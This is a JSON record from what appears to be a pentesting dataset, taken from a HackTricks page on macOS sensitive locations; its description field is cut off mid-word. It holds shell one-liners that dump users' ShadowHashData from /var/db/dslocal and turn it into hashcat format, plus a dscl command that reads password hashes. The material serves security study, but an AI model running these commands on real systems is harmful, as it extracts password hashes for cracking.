{
  "id": "macos_hardening_f8a8c1c0c9c6",
  "category": "macos-hardening",
  "title": "macos sensitive locations",
  "description": "# macOS Sensitive Locations & Interesting Daemons\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Passwords\n\n### Shadow Passwords\n\nShadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\\\nThe following oneliner can be use to dump **all the information about the users** (including hash info):\n\n```bash\nfor l in /var/db/dslocal/nodes/Default/users/*; do if [ -r \"$l\" ];then echo \"$l\"; defaults read \"$l\"; fi; done\n```\n\n[**Scri",
  "payloads": [
    "# macOS Sensitive Locations & Interesting Daemons",
    "{{#include ../../../banners/hacktricks-training.md}}",
    "## Passwords",
    "### Shadow Passwords",
    "Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\\",
    "The following oneliner can be use to dump **all the information about the users** (including hash info):",
    "```bash",
    "for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r \"$l\" ];then echo \"$l\"; defaults read \"$l\"; fi; done",
    "[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.",
    "An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):",
    "```bash",
    "sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex \"[^_]*\"); do plutil -extract name.0 raw $i | awk \"{printf \\$0\\\":\\$ml\\$\\\"}\"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk \"{printf \\\"$\\\"\\$0}\"; fi; done; echo \"\"; done'",
    "Another way to obtain the `ShadowHashData` of a user is by using `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``",
    "### /etc/master.passwd",
    "This file is **only used** when the system id running in **single-user mode** (so not very frequently)."
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-files-folders-and-binaries/macos-sensitive-locations.md"
  ]
}